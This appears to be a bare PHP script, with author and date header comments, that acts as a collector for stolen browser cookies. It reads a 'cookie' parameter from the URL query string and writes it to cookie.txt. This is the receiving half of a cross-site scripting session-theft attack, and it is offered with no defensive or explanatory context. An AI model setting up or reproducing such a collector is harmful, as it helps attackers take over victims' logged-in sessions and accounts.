<?php
/*
 * @Author: lh@metgs.com
 * @Date: 2023-05-25 12:42:59
 * @LastEditors: lh@metgs.com
 * @LastEditTime: 2023-05-25 15:03:09
 * @Description: ...
 */

$cookie = $_GET['cookie'];

file_put_contents('cookie.txt', $cookie);

